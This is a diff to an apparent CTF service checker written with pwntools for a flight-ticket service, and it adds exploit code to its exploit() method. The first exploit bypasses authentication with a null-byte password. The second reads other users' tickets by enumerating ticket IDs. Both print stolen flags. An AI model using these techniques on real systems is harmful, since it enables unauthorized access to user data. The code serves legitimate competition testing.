@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-#socat TCP-LISTEN:7478,nodelay,reuseaddr,fork EXEC:"stdbuf -i0 -o0 -e0 ./a.out"
-
+ 
 from pwn import * 
 import sys
 import time
@@ -238,6 +237,7 @@ class FlugChecker(BaseChecker):
 
     def exploit(self):
         #1st vuln
+
         p = remote(self.address,port)
         username = self.team_db[self.flag][0]
 
@@ -245,26 +245,70 @@ class FlugChecker(BaseChecker):
         p.sendlineafter(b"================\n",b'1')
         p.sendlineafter(b"Please input your username:\n",bytes(username,'utf-8'))
         p.sendlineafter(b"Please input your password:\n",'\x00')
-        #p.recvline() #TODO: odstrani ko urban popravi svoje randomly placed printfe
-        p.recv(2)
-        check_line = p.recvline().decode('utf-8').strip()
+
+        p.recvuntil('welcome ')
+        check_line = p.recvline().decode('utf-8').replace('\n','')
+
         p.recvuntil(b"================\n")
         p.sendlineafter(b"================\n",b"2")
         stdo = p.recvline()
         flag_id = p.recvline().decode('utf-8').split(' ')[1]
+
         p.recvuntil(b"================\n")
         p.sendlineafter(b"================\n",b"3")
         p.sendlineafter(b"Enter the unique id of your ticket",bytes(flag_id,'utf-8'))
         p.recvline()
         p.recvline()
-        flag = p.recvline().decode('utf-8').split()
+        flag = p.recvline().decode('utf-8').replace('\n','')
 
-
-        if username in check_line:
+        if username == check_line:
             print(flag)
         else:
             print("Sad nox")
         pass
+
+        #++++++++++++++++++++++++++++++++++++++++++++
+        #++++++++++++++++++++++++++++++++++++++++++++
+    
+        #2nd wuln
+    
+        p = remote(self.address,port)
+
+        username = self.team_db[self.flag][0] 
+
+        p.recvuntil('================\n')
+        p.sendlineafter('================\n',b'1')
+        p.sendlineafter('Please input your username:\n',bytes(username,'utf-8'))
+        p.sendlineafter('Please input your password:\n',b'x_x_x_x_x_x')
+        
+        
+        p.recvuntil('================\n')
+        p.sendlineafter('================\n',b'5')
+        p.sendlineafter('Please input origin airport\n','x_x_x_x_x_x')
+        p.sendlineafter('Please input destination airport\n','x_x_x_x_x_x')
+        p.sendlineafter('Enter the content of your new ticket\n','x_x_x_x_x_x')
+        p.recvuntil('Your new ticket ID is:\n')
+        new_id = int(p.recvline().decode('utf-8').replace('\n',''),10)
+        
+        
+        p.recvuntil('================\n')
+        p.sendlineafter('================\n',b'3')
+        p.sendlineafter('Enter the unique id of your ticket\n',bytes(str(new_id),'utf-8'))
+        p.recvline()
+        p.recvline()
+        p.recvline()
+        flag_id = int(p.recvline().decode('utf-8').replace('\n',''),10)
+        
+        
+        p.recvuntil('================\n')
+        p.sendlineafter('================\n',b'3')
+        p.sendlineafter('Enter the unique id of your ticket\n',bytes(str(flag_id),'utf-8'))
+        p.recvline()
+        
+        
+        flag = str(p.recvline().decode('utf-8').replace('\n',''))
+        
+        print(flag)
 
     def gen_user(self): 
         source = list(string.ascii_lowercase)
